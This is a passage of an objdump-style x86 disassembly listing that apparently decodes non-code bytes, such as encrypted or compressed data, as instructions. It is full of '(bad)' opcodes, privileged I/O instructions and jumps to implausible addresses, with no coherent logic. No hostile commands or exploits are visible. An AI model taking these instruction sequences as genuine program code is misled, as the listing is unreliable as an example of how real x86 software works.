  417769:	lods   al,BYTE PTR ds:[esi]
  41776a:	dec    edi
  41776b:	fidiv  DWORD PTR [edx+0x7f8b53c0]
  417771:	js     0x4176ff
  417773:	cmp    DWORD PTR [esi],ecx
  417775:	pop    ebx
  417776:	dec    ecx
  417777:	or     edi,DWORD PTR [ebp-0x3186229c]
  41777d:	inc    esp
  41777e:	mov    ch,0xc7
  417780:	mov    ebx,0xab5e1f5b
  417785:	sahf   
  417786:	out    0xcf,al
  417788:	lods   al,BYTE PTR ds:[esi]
  417789:	add    DWORD PTR [edx],ebp
  41778b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41778c:	cmp    ebx,DWORD PTR [eax+0xb796]
	...
  4177f2:	add    BYTE PTR [eax],al
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	jb     0x41783c
  417802:	cmp    al,0x99
  417804:	je     0x4177fe
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	add    edi,0x3c
  41780f:	and    BYTE PTR [ecx-0x5c],cl
  417812:	mov    eax,0x919de4df
  417817:	rcl    DWORD PTR [edi-0x357822da],0x47
  41781e:	mov    bh,0x93
  417820:	mov    eax,ds:0x9c27035f
  417825:	sbb    eax,0xeec1924b
  41782a:	ins    DWORD PTR es:[edi],dx
  41782b:	cwde   
  41782c:	adc    eax,0x35910fbf
  417831:	loopne 0x4177eb
  417833:	shl    BYTE PTR [edx],0x37
  417836:	push   edx
  417837:	stos   DWORD PTR es:[edi],eax
  417838:	retf   
  417839:	cmc    
  41783a:	jae    0x41780f
  41783c:	rol    BYTE PTR [ebp-0x55],0x92
  417840:	dec    esi
  417841:	fbstp  TBYTE PTR [esi]
  417843:	push   ebp
  417844:	fwait
  417845:	test   DWORD PTR [esi],ebx
  417847:	xchg   BYTE PTR [eax-0x29],al
  41784a:	cs int 0x98
  41784d:	mov    ebp,0x8f8076aa
  417852:	rol    DWORD PTR [esi-0x64],cl
  417855:	jg     0x4178ba
  417857:	push   ds
  417858:	nop
  417859:	adc    DWORD PTR [ecx-0x40ba02fc],edi
  41785f:	mov    esp,0xffe8e8a
  417864:	mov    ds:0xc533c844,eax
  417869:	adc    ah,BYTE PTR [esi]
  41786b:	mov    edi,0xff6e2e4c
  417870:	addr16 leave 
  417872:	data16 xor BYTE PTR [ebp+0xf],0x12
  417877:	iret   
  417878:	push   edx
  417879:	dec    eax
  41787a:	sub    BYTE PTR [ebx+0x5c451d0e],al
  417880:	xchg   ebx,eax
  417881:	fstp   TBYTE PTR [ebp+0x2e]
  417884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417885:	xor    DWORD PTR [edi-0x3e],0x38d980e3
  41788c:	adc    eax,0xfeb4e587
  417891:	xchg   esi,eax
  417892:	xchg   al,ah
  417894:	loop   0x4178af
  417896:	ss sub ecx,esi
  417899:	jmp    0xa2d80992
  41789e:	adc    DWORD PTR [ebx],esp
  4178a0:	out    dx,eax
  4178a1:	scas   eax,DWORD PTR es:[edi]
  4178a2:	in     al,0xd7
  4178a4:	popa   
  4178a5:	popf   
  4178a6:	xchg   ecx,eax
  4178a7:	enter  0xae5d,0xb5
  4178ab:	sub    eax,0x4fc1ec68
  4178b0:	outs   dx,BYTE PTR ds:[esi]
  4178b1:	and    eax,0x9d4f115d
  4178b6:	mov    ebp,0x39a9ba95
  4178bb:	xor    DWORD PTR ds:0xb6795d51,ecx
  4178c1:	lds    ebx,FWORD PTR [ecx+0x73]
  4178c4:	imul   edx,DWORD PTR [eax+0x69],0x44
  4178c8:	cmp    eax,0xd535eb81
  4178cd:	je     0x4178fe
  4178cf:	sub    ebp,0xbec96a98
  4178d5:	mov    eax,0x252c9f33
  4178da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178db:	xor    DWORD PTR [esi],0x27
  4178de:	imul   edx,DWORD PTR [ebx-0x4b],0x7da10a9a
  4178e5:	push   ebx
  4178e6:	test   DWORD PTR [ecx+0x44],0x5eba0657
  4178ed:	(bad)  
  4178ee:	jno    0x41794e
  4178f0:	mov    ebx,0x18512a6f
  4178f5:	mov    bh,0x97
  4178f7:	enter  0x3470,0xdf
  4178fb:	mov    al,ds:0xfbe881b
  417900:	cmp    ebx,DWORD PTR ds:0x722c323a
  417906:	jg     0x417914
  417908:	in     eax,0xe0
  41790a:	popf   
  41790b:	sbb    DWORD PTR [eax-0xb],0x0
  41790f:	add    BYTE PTR [eax],0x0
	...
  417972:	add    BYTE PTR [eax],al
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	outs   dx,BYTE PTR ds:[esi]
  417981:	mov    ah,0x9d
  417983:	sub    edi,DWORD PTR [eax-0x7]
  417986:	add    BYTE PTR [eax],al
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	test   DWORD PTR [edx+0x54],0x7aefd6ad
  417993:	dec    ebx
  417994:	out    0xaf,al
  417996:	jmp    0x4179a6
  417998:	mov    eax,0xb6c7eaf5
  41799d:	jbe    0x417a1c
  41799f:	ret    
  4179a0:	xor    bl,BYTE PTR ds:0xfbdbdad8
  4179a6:	mov    dh,0xf4
  4179a8:	mov    al,BYTE PTR ds:[edx-0x4825b4eb]
  4179af:	inc    edx
  4179b0:	dec    ebp
  4179b1:	rcl    DWORD PTR [ebp+edx*1+0x96d7ff6],0x3b
  4179b9:	retf   0x4bdb
  4179bc:	daa    
  4179bd:	adc    DWORD PTR ds:0x91e169df,0x5126579
  4179c7:	pop    edx
  4179c8:	push   0x5
  4179ca:	and    BYTE PTR [edx],dh
  4179cc:	fnstenv [edi-0xf]
  4179cf:	sbb    eax,0xb408a1fc
  4179d4:	cmp    bl,BYTE PTR [eax+eiz*4-0x5c]
  4179d8:	fnstenv [ebp-0x5d]
  4179db:	loop   0x417a1d
  4179dd:	sbb    BYTE PTR [esi+edx*2+0x148371b9],al
  4179e4:	xchg   edx,eax
  4179e5:	repz repz jge 0x4179f8
  4179e9:	push   0xec2da496
  4179ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179ef:	mov    cl,0xde
  4179f1:	mov    ah,0x3a
  4179f3:	adc    ebp,esi
  4179f5:	(bad)  [ebp+0x2d]
  4179f8:	sahf   
  4179f9:	pop    eax
  4179fa:	pusha  
  4179fb:	ds (bad) 
  4179fd:	clc    
  4179fe:	scas   eax,DWORD PTR es:[edi]
  4179ff:	xchg   edi,eax
  417a00:	les    ecx,FWORD PTR [edx+0x72]
  417a03:	arpl   WORD PTR [eax-0x619a8359],ax
  417a09:	add    bh,ah
  417a0b:	xor    eax,0x3534745
  417a10:	mov    DWORD PTR [ebx],ecx
  417a12:	jecxz  0x41799b
  417a14:	jno    0x417a53
  417a16:	mov    ch,0x8d
  417a18:	pop    esp
  417a19:	mov    ebx,0x7cc36d20
  417a1f:	in     eax,dx
  417a20:	xor    al,0xfd
  417a22:	jmpw   0x180a
  417a26:	mov    bh,0xe2
  417a28:	push   gs
  417a2a:	ins    BYTE PTR es:[edi],dx
  417a2b:	shr    DWORD PTR [ebx-0xb23507d],0x81
  417a32:	and    al,0xaa
  417a34:	ud0    ebp,DWORD PTR [esi-0x15]
  417a38:	(bad)  
  417a39:	(bad)  
  417a3a:	fwait
  417a3b:	ror    BYTE PTR [eax],1
  417a3d:	in     al,0xf5
  417a3f:	mov    edi,0x8eedb3d0
  417a44:	ja     0x4179eb
  417a46:	xchg   edi,eax
  417a47:	in     al,dx
  417a48:	xlat   BYTE PTR ds:[ebx]
  417a49:	add    BYTE PTR [eax],dl
  417a4b:	push   ebx
  417a4c:	inc    edx
  417a4d:	sbb    edx,0x4
  417a50:	pop    ecx
  417a51:	pop    esp
  417a52:	xchg   esi,eax
  417a53:	mov    edx,DWORD PTR [esi-0x6d]
  417a56:	cmp    eax,0xa19cf6b0
  417a5b:	fidiv  DWORD PTR [esi-0x45ff374a]
  417a61:	inc    esi
  417a62:	nop
  417a63:	inc    edi
  417a64:	jns    0x417a47
  417a66:	xchg   ebx,eax
  417a67:	inc    ebx
  417a68:	sub    BYTE PTR [edi],al
  417a6a:	sub    ebx,eax
  417a6c:	bound  edi,QWORD PTR [ebx]
  417a6e:	outs   dx,DWORD PTR ds:[esi]
  417a6f:	(bad)  
  417a70:	mov    ds:0xf3b93e41,al
  417a75:	sbb    BYTE PTR [eax+0x69],0xa3
  417a79:	sbb    bl,BYTE PTR [esi]
  417a7b:	shr    BYTE PTR [ebx],1
  417a7d:	push   eax
  417a7e:	dec    esi
  417a7f:	jo     0x417afe
  417a81:	into   
  417a82:	mov    dh,0xd7
  417a84:	(bad)  
  417a85:	fmul   DWORD PTR [edx]
  417a87:	or     DWORD PTR [eax-0x5b],0xe8a49d28
  417a8e:	cli    
  417a8f:	pop    es
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x2215310f]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	pushf  
  417b0d:	inc    ebp
  417b0e:	sub    eax,0x83cfea43
  417b13:	aam    0x1b
  417b15:	and    edx,DWORD PTR [ebx]
  417b17:	repnz icebp 
  417b19:	stos   DWORD PTR es:[edi],eax
  417b1a:	fist   WORD PTR [ecx]
  417b1c:	inc    edx
  417b1d:	daa    
  417b1e:	jbe    0x417b36
  417b20:	scas   al,BYTE PTR es:[edi]
  417b21:	mov    al,0x37
  417b23:	in     al,0xc5
  417b25:	mov    eax,0xcb65ca89
  417b2a:	aaa    
  417b2b:	sahf   
  417b2c:	jmp    0x224f4398
  417b31:	daa    
  417b32:	int3   
  417b33:	ffree  st(0)
  417b35:	hlt    
  417b36:	xlat   BYTE PTR ds:[ebx]
  417b37:	sahf   
  417b38:	xor    BYTE PTR [eax],cl
  417b3a:	mov    ah,0x41
  417b3c:	bound  edi,QWORD PTR [ecx+0x48]
  417b3f:	pop    esp
  417b40:	cld    
  417b41:	xchg   edi,eax
  417b42:	sub    eax,0x1c3f337f
  417b47:	push   ebx
  417b48:	push   edi
  417b49:	xor    eax,0x4378a3cc
  417b4e:	inc    eax
  417b4f:	je     0x417ad9
  417b51:	pop    ss
  417b52:	jno    0x417ad7
  417b54:	pop    eax
  417b55:	js     0x417b03
  417b57:	and    al,0x4f
  417b59:	xor    DWORD PTR ds:0x3bb8d66d,ebp
  417b5f:	les    ecx,FWORD PTR [ebp+0x5c994b8c]
  417b65:	adc    BYTE PTR [edx+0x24],dh
  417b68:	int    0x41
  417b6a:	jecxz  0x417b85
  417b6c:	or     BYTE PTR [ebx],dl
  417b6e:	cmp    esp,0x1a
  417b71:	mov    edx,ss
  417b73:	mov    eax,0xdfd955d9
  417b78:	call   0x88a66dab
  417b7d:	ret    0x2ed
  417b80:	mov    edi,0x5c190a10
  417b85:	mov    edx,0xbe2ebfd3
  417b8a:	(bad)  
  417b8c:	mov    eax,0xf252fa0
  417b91:	in     al,0xe9
  417b93:	add    esp,ebp
  417b95:	pusha  
  417b96:	push   edi
  417b97:	cwde   
  417b98:	and    ebx,DWORD PTR [eax+0x66]
  417b9b:	inc    edx
  417b9c:	idiv   al
  417b9e:	cmp    eax,0xab71ef8c
  417ba3:	jo     0x417c12
  417ba5:	lock dec eax
  417ba7:	pop    ss
  417ba8:	(bad)  
  417ba9:	fnstsw WORD PTR [edx-0x60]
  417bac:	cmp    dh,BYTE PTR [ebp+0x14]
  417baf:	and    ecx,DWORD PTR [edx]
  417bb1:	ins    DWORD PTR es:[edi],dx
  417bb2:	mov    dl,0x99
  417bb4:	aam    0xd3
  417bb6:	sti    
  417bb7:	jnp    0x417b96
  417bb9:	sbb    ebp,DWORD PTR [ecx+ebp*2-0x76]
  417bbd:	pop    eax
  417bbe:	or     edi,DWORD PTR [esi]
  417bc0:	outs   dx,BYTE PTR ds:[esi]
  417bc1:	jae    0x417bd4
  417bc3:	dec    ebx
  417bc4:	cwde   
  417bc5:	pop    ecx
  417bc6:	cmp    cl,dh
  417bc8:	push   ebp
  417bc9:	xchg   DWORD PTR [edi-0x1d0ef0e6],edi
  417bcf:	add    dl,BYTE PTR [edx+0x11]
  417bd2:	ret    
  417bd3:	cmp    esp,DWORD PTR [edi-0x307d1a19]
  417bd9:	(bad)  
  417bda:	shl    DWORD PTR [ecx+edi*8+0x7b],cl
  417bde:	(bad)  
  417bdf:	stc    
  417be0:	cmp    ebx,DWORD PTR [eax+0x19]
  417be3:	test   ebp,esp
  417be5:	ins    BYTE PTR es:[edi],dx
  417be6:	jns    0x417c34
  417be8:	jl     0x417c1b
  417bea:	in     eax,0x7b
  417bec:	dec    esi
  417bed:	push   ecx
  417bee:	sub    DWORD PTR [eax],0x1be548e
  417bf4:	(bad)  
  417bf5:	call   0x92b272de
  417bfa:	call   0xc9a4c1da
  417bff:	adc    BYTE PTR [edi+0x4e493889],bh
  417c05:	jb     0x417bea
  417c07:	test   BYTE PTR [edx],ch
  417c09:	xchg   edx,eax
  417c0a:	lahf   
  417c0b:	mov    bl,0xfb
  417c0d:	in     al,0x0
  417c0f:	repz add BYTE PTR [eax],al
	...
  417c72:	add    BYTE PTR [eax],al
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xff
  417c81:	inc    esp
  417c82:	mov    ebp,0xfb802b
  417c87:	add    BYTE PTR [ecx+eax*1],al
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	mov    ch,0x9f
  417c8e:	pop    ebp
  417c8f:	inc    esi
  417c90:	mov    eax,0x1d98b102
  417c95:	sbb    bh,BYTE PTR [eax+0x58]
  417c98:	xor    DWORD PTR [ebx+0x1640427],edi
  417c9e:	xchg   edx,eax
  417c9f:	test   BYTE PTR [edi],cl
  417ca1:	cdq    
  417ca2:	and    bl,BYTE PTR [edx-0x75]
  417ca5:	sub    DWORD PTR [edx-0x502a733],0xffffffe5
  417cac:	pop    edi
  417cad:	cmp    ebx,DWORD PTR [ebx+0x29e9475]
  417cb3:	es sbb eax,esp
  417cb6:	mov    ds:0x85e52d3c,al
  417cbb:	or     al,0x67
  417cbd:	arpl   di,bx
  417cbf:	into   
  417cc0:	pusha  
  417cc1:	xchg   ebp,eax
  417cc2:	jp     0x417c5e
  417cc4:	mov    bh,0x4f
  417cc6:	aas    
  417cc7:	mov    ebx,0x7074e4c6
  417ccc:	addr16 aas 
  417cce:	sbb    DWORD PTR [ebp-0x76],esi
  417cd1:	add    edx,DWORD PTR [ebp+0x4159c486]
  417cd7:	dec    eax
  417cd8:	jmp    0x417d24
  417cda:	cwde   
  417cdb:	jbe    0x417d16
  417cdd:	sbb    eax,0x4cac652a
  417ce2:	xchg   edx,eax
  417ce3:	ret    
  417ce4:	xchg   esp,eax
  417ce5:	retf   
  417ce6:	adc    eax,esi
  417ce8:	adc    eax,0x24e28daa
  417ced:	sbb    ecx,DWORD PTR [ecx]
  417cef:	shr    edx,cl
  417cf1:	loope  0x417cbd
  417cf3:	mov    al,0x1c
  417cf5:	sbb    al,0xde
  417cf7:	test   dh,0x51
  417cfa:	mov    DWORD PTR [ecx+0x5e],ebx
  417cfd:	lea    ebp,[eax+ebp*8]
  417d00:	cmp    ch,BYTE PTR [eax]
  417d02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d03:	(bad)  
  417d04:	push   ebp
  417d05:	inc    esp
  417d06:	pop    ss
  417d07:	add    DWORD PTR [ebx],ebx
  417d09:	dec    ebp
  417d0a:	inc    edi
  417d0c:	std    
  417d0d:	push   ds
  417d0e:	ret    0x1888
  417d11:	fcom   DWORD PTR [ebp-0x75102577]
  417d17:	mov    cs,WORD PTR [edi-0x48e32fe5]
  417d1d:	xlat   BYTE PTR ds:[ebx]
  417d1e:	ret    
  417d1f:	imul   DWORD PTR [ecx]
  417d21:	and    bl,BYTE PTR [edi-0x21394833]
  417d27:	lds    eax,FWORD PTR [edi-0x7428b54a]
  417d2d:	ds psubw mm4,mm7
  417d31:	pop    esp
  417d32:	jle    0x417d25
  417d34:	sub    DWORD PTR [edx+eiz*1+0x2cce708],ecx
  417d3b:	sbb    al,0xb4
  417d3d:	mov    WORD PTR [esi+0xdde3af7],gs
  417d43:	add    ah,BYTE PTR [edx+0x28]
  417d46:	push   0xffffff87
  417d48:	push   ds
  417d49:	sbb    esp,DWORD PTR [esi]
  417d4b:	or     al,0xf8
  417d4d:	mov    ah,0xfd
  417d4f:	inc    edi
  417d50:	dec    ebp
  417d51:	xchg   DWORD PTR [eax-0x1a],esp
  417d54:	jecxz  0x417d0d
  417d56:	inc    esp
  417d57:	arpl   WORD PTR [ecx],dx
  417d59:	xchg   edx,eax
  417d5a:	inc    ebx
  417d5b:	test   al,0x8b
  417d5d:	adc    eax,0x78feda54
  417d62:	cdq    
  417d63:	fild   QWORD PTR [edi-0x35eaa686]
  417d69:	inc    edi
  417d6a:	enter  0x7084,0x6e
  417d6e:	push   es
  417d6f:	test   DWORD PTR [ebx-0x4e73a7bd],ecx
  417d75:	retf   
  417d76:	int    0xd5
  417d78:	or     edi,DWORD PTR ds:0x20eba734
  417d7e:	leave  
  417d7f:	fbstp  TBYTE PTR [ecx]
  417d81:	xor    BYTE PTR [edi+0x5d],cl
  417d84:	fs add al,0xb1
  417d87:	pushf  
  417d88:	sbb    DWORD PTR [edx+0x1110fb98],esi
  417d8e:	shl    BYTE PTR [ebx+0x0],cl
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	adc    eax,0x8462d182
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	dec    ebp
  417e0d:	aam    0xf8
  417e0f:	mov    bl,0x69
  417e11:	data16 jne 0x417e0d
  417e14:	push   ebp
  417e15:	ror    DWORD PTR [eax+eiz*8],0x3c
  417e19:	inc    edi
  417e1a:	adc    eax,0xd8d8e61d
  417e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e20:	stc    
  417e21:	addr16 ret 0x7931
  417e25:	sbb    eax,0xbd4351c3
  417e2a:	add    ebp,DWORD PTR [edx-0x6dcbdbe3]
  417e30:	div    DWORD PTR [ecx]
  417e32:	fnstsw WORD PTR [ebp+0x78]
  417e35:	out    0xc3,al
  417e37:	push   ebx
  417e38:	mov    ds,WORD PTR [esi-0x7a]
  417e3b:	stc    
  417e3c:	mov    edi,DWORD PTR ds:0xc76da221
  417e42:	sub    DWORD PTR [ebx+eiz*4-0x2f43b541],edx
  417e49:	sub    al,0xd1
  417e4b:	dec    esi
  417e4c:	out    dx,eax
  417e4d:	lds    ebx,FWORD PTR ds:0xc8cb3dff
  417e53:	and    al,0xac
  417e55:	mov    cl,0x9c
  417e57:	repz sbb al,0x16
  417e5a:	in     al,0xa0
  417e5c:	mov    esi,esp
  417e5e:	push   esp
  417e5f:	scas   al,BYTE PTR es:[edi]
  417e60:	leave  
  417e61:	pushf  
  417e62:	dec    ebx
  417e63:	sbb    eax,0x83f5d411
  417e68:	(bad)  [edx+eax*8-0xc]
  417e6c:	and    eax,ebp
  417e6e:	in     eax,0x57
  417e70:	popf   
  417e71:	mov    esi,eax
  417e73:	aam    0x39
  417e75:	dec    esp
  417e76:	ret    0x9396
  417e79:	add    eax,0xde742ac9
  417e7e:	xchg   esp,eax
  417e7f:	xchg   BYTE PTR [eax],ch
  417e81:	dec    ecx
  417e82:	mov    edi,0x125d5221
  417e87:	sbb    eax,0x1972a575
  417e8c:	icebp  
  417e8d:	mov    esi,DWORD PTR [eax-0x2a]
  417e90:	fadd   st(4),st
  417e92:	mov    bh,0x94
  417e94:	iret   
  417e95:	add    BYTE PTR [edx-0x7f32300f],cl
  417e9b:	retf   
  417e9c:	inc    ecx
  417e9d:	hlt    
  417e9e:	sub    bl,cl
  417ea0:	jbe    0x417eea
  417ea2:	outs   dx,DWORD PTR ds:[esi]
  417ea3:	xor    cl,BYTE PTR [edx+ebx*1+0x5e0eec]
  417eaa:	lods   eax,DWORD PTR ds:[esi]
  417eab:	inc    eax
  417eac:	jmp    FWORD PTR [edi-0x77]
  417eaf:	outs   dx,DWORD PTR ds:[esi]
  417eb0:	mov    ah,0x4b
  417eb2:	leave  
  417eb3:	mov    DWORD PTR [esp],edi
  417eb6:	outs   dx,BYTE PTR ds:[esi]
  417eb7:	stc    
  417eb8:	loope  0x417ec1
  417eba:	les    esi,FWORD PTR [esp+ecx*8]
  417ebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ebe:	jb     0x417e57
  417ec0:	sbb    eax,ebx
  417ec2:	call   0xe50300d6
  417ec7:	lahf   
  417ec8:	test   al,0x90
  417eca:	xchg   edi,eax
  417ecb:	loope  0x417f2e
  417ecd:	ret    0x6350
  417ed0:	lock xchg esp,ecx
  417ed3:	retf   0x3efd
  417ed6:	(bad)  
  417ed7:	sub    edx,DWORD PTR [edi]
  417ed9:	cwde   
  417eda:	cdq    
  417edb:	aad    0x2
  417edd:	jnp    0x417f47
  417edf:	stos   DWORD PTR es:[edi],eax
  417ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ee1:	retf   0xe661
  417ee4:	lock dec esi
  417ee6:	or     ecx,edi
  417ee8:	inc    edi
  417ee9:	fld    DWORD PTR [eax+0x30]
  417eec:	mov    cs,WORD PTR [ebx+0x2b16916f]
  417ef2:	fild   WORD PTR [edx+esi*8+0x5d980891]
  417ef9:	jne    0x417ec2
  417efb:	fadd   st(2),st
  417efd:	addr16 pop ecx
  417eff:	and    eax,0xcf0f5cd7
  417f04:	xor    esi,edi
  417f06:	dec    ecx
  417f07:	push   ds
  417f08:	iret   
  417f09:	ret    0x4a8f
  417f0c:	jle    0x417efb
  417f0e:	hlt    
  417f0f:	mov    ds:0x0,al
	...
  417f74:	(bad)  
  417f75:	out    0xe6,al
  417f77:	cmp    esp,esi
  417f79:	cmp    edi,edi
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	push   ecx
  417f81:	in     al,dx
  417f82:	sbb    edi,0xffffff88
  417f85:	std    
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    al,0x1
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	dec    ecx
  417f8d:	jl     0x417f4e
  417f8f:	fwait
  417f90:	mov    esp,0xed2c7c8a
  417f95:	mov    al,ds:0xf4095d39
  417f9a:	aad    0x34
  417f9c:	push   ebx
  417f9d:	cmp    DWORD PTR [ecx-0x45],esp
  417fa0:	std    
  417fa1:	sbb    BYTE PTR [edi+0x3e],ah
  417fa4:	out    dx,al
  417fa5:	adc    dl,cl
  417fa7:	mov    bl,0x5d
  417fa9:	jae    0x417fbd
  417fab:	into   
  417fac:	cmp    DWORD PTR [edi-0x19],eax
  417faf:	sub    al,0x7f
  417fb1:	arpl   WORD PTR [esi+0x6e],bx
  417fb4:	lods   eax,DWORD PTR ds:[esi]
  417fb5:	jb     0x417fee
  417fb7:	neg    BYTE PTR [eax+0x46e0f6fd]
  417fbd:	sub    cl,cl
  417fbf:	xchg   dh,cl
  417fc1:	stc    
  417fc2:	ds cmc 
  417fc4:	xor    edx,ebp
  417fc6:	gs mov esi,0x9d5b6948
  417fcc:	movaps XMMWORD PTR [eax],xmm7
  417fcf:	sbb    edi,esp
  417fd1:	nop
  417fd2:	and    al,0x71
  417fd4:	or     al,0xb5
  417fd6:	jmp    0x417f5b
  417fd8:	call   0x69ef:0xe4d576ea
  417fdf:	adc    ah,BYTE PTR [edx-0xb9ed69d]
  417fe5:	ins    BYTE PTR es:[edi],dx
  417fe6:	inc    edi
  417fe7:	dec    esp
  417fe8:	fadd   DWORD PTR [ebp-0x4f]
  417feb:	mov    ah,0xd6
  417fed:	mov    dl,0xb3
  417fef:	xchg   esi,eax
  417ff0:	pop    edi
  417ff1:	mov    bh,0x42
  417ff3:	je     0x418018
  417ff5:	aam    0xc2
  417ff7:	inc    esi
  417ff8:	add    al,0x71
  417ffa:	xchg   esi,eax
  417ffb:	pop    es
  417ffc:	or     cl,BYTE PTR [esi]
  417ffe:	cdq    
  417fff:	add    BYTE PTR [esi+0x545370bf],0x49
  418006:	lds    ebp,FWORD PTR [esi]
  418008:	je     0x418020
  41800a:	mov    eax,ds:0xf5bbafb8
  41800f:	iret   
  418010:	adc    eax,0xba58d676
  418015:	(bad)  
  418016:	stos   DWORD PTR es:[edi],eax
  418017:	test   BYTE PTR [ecx-0x446ef23],cl
  41801d:	(bad)  
  41801e:	mov    ebp,0x9f93b54d
  418023:	adc    bh,BYTE PTR [esi+0x2]
  418026:	xchg   dh,al
  418028:	imul   ebx,DWORD PTR ds:0x9583b01f,0x39559b74
  418032:	sar    DWORD PTR [esi+edi*8+0x74],0x71
  418037:	xchg   BYTE PTR [ebx+0x3f],dl
  41803a:	in     eax,dx
  41803b:	retf   0xf0f4
  41803e:	outs   dx,BYTE PTR ds:[esi]
  41803f:	ror    DWORD PTR [esp+edi*4],1
  418042:	push   edi
  418043:	pop    eax
  418044:	and    ebp,edx
  418046:	aas    
  418047:	bound  edx,QWORD PTR [eax]
  418049:	jmp    0x1afce6ed
  41804e:	popf   
  41804f:	stc    
  418050:	scas   al,BYTE PTR es:[edi]
  418051:	fs push ss
  418053:	(bad)  
  418054:	lods   eax,DWORD PTR ds:[esi]
  418055:	push   edi
  418056:	loope  0x4180c2
  418058:	stos   DWORD PTR es:[edi],eax
  418059:	jne    0x41801e
  41805b:	mov    fs,WORD PTR [edi-0x3c]
  41805e:	adc    BYTE PTR [esi+edi*8-0x7b],ch
  418062:	sbb    al,0x4
  418064:	mov    esi,0x7dab2dc1
  418069:	and    eax,0x284ff278
  41806e:	inc    ebp
  41806f:	or     dl,BYTE PTR [ebx]
  418071:	cli    
  418072:	push   ecx
  418073:	data16 mov bl,0xa5
  418076:	jb     0x41800a
  418078:	and    esp,DWORD PTR [ebx]
  41807a:	add    eax,0x685cc326
  41807f:	xor    dh,BYTE PTR [edi]
  418081:	mov    edx,0x5d35de82
  418086:	vpminsb ymm1,ymm2,YMMWORD PTR [esp+esi*2]
  41808c:	test   al,0x92
  41808e:	dec    ecx
  41808f:	or     al,BYTE PTR [eax]
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x1e2fdebc,eax
  418101:	(bad)  
  418102:	pushw  0xff8c
  418105:	inc    BYTE PTR [eax]
  418107:	add    BYTE PTR [ecx+eax*1],al
  41810a:	add    BYTE PTR [eax],al
  41810c:	lea    edx,[ebx-0x3711905d]
  418112:	loop   0x418120
  418114:	loopne 0x41815b
  418116:	xchg   edx,eax
  418117:	fisttp WORD PTR [ebx-0x2c]
  41811a:	lds    ecx,FWORD PTR [ecx]
  41811c:	inc    ebx
  41811d:	sub    ecx,DWORD PTR [ebx]
  41811f:	push   ecx
  418120:	rol    DWORD PTR [edx+0x636f21c9],0x8f
  418127:	mov    ch,0x2c
  418129:	mov    ebp,0x998c6e06
  41812e:	sub    BYTE PTR [ebp-0x76],al
  418131:	sar    DWORD PTR [ebx-0x13],1
  418134:	cmp    al,0x2f
  418136:	fmul   DWORD PTR [esp+edx*2]
  418139:	xchg   edx,eax
  41813a:	dec    ecx
  41813b:	xor    ecx,DWORD PTR [ecx]
  41813d:	loope  0x4181b4
  41813f:	aad    0xdd
  418141:	out    dx,al
  418142:	mov    bh,0x96
  418144:	and    esi,edx
  418146:	les    eax,FWORD PTR [ebp+0x4f]
  418149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41814a:	ret    0x5e63
  41814d:	int    0x8e
  41814f:	pop    ds
  418150:	mov    esi,0xc8fb0d84
  418155:	lock adc BYTE PTR [eax-0x19],ch
  418159:	inc    esp
  41815a:	stos   BYTE PTR es:[edi],al
  41815b:	dec    ecx
  41815c:	pop    edi
  41815d:	in     eax,0x7d
  41815f:	popa   
  418160:	outs   dx,DWORD PTR ds:[esi]
  418161:	out    dx,al
  418162:	ins    BYTE PTR es:[edi],dx
  418163:	lods   eax,DWORD PTR ds:[esi]
  418164:	and    edx,DWORD PTR [edi-0xa70c2ec]
  41816a:	into   
  41816b:	ret    
  41816c:	cmp    esi,DWORD PTR [eax+edi*2]
  41816f:	inc    ebp
  418170:	jno    0x4181d2
  418172:	mov    ah,0x42
  418174:	shl    esp,cl
  418176:	xchg   edx,eax
  418177:	das    
  418178:	jbe    0x41817e
  41817a:	das    
  41817b:	fwait
  41817c:	ds nop
  41817e:	psrlw  mm5,QWORD PTR [ebx]
  418181:	xor    BYTE PTR [edx],dh
  418183:	not    BYTE PTR [esi+0x214a006e]
  418189:	push   es
  41818a:	mov    esp,0xd93a4a79
  41818f:	jmp    eax
  418191:	jae    0x4181b1
  418193:	dec    ebx
